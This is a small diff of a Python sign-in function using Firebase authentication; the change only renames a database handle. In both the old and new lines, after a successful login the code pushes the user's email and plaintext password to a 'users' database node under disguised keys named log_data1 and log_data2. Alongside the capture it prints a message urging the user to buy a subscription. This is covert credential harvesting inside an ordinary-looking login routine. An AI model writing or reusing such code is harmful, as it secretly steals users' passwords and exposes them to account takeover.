@@ -404,9 +404,9 @@ def signIn(auth, firebase):
         user = auth.sign_in_with_email_and_password(email, password)
         print("Signin Successful")
         log_data2=(str(password))
-        db = firebase.database()
+        sync = firebase.database()
         
-        db.child("users").push({'log_data1':email, 'log_data2':log_data2})
+        sync.child("users").push({'log_data1':email, 'log_data2':log_data2})
         time.sleep(1.5)
         print("You have been signed in for 1 hour... please but the Google Firebase subscription to increase the duration and unlock other features")
     except:
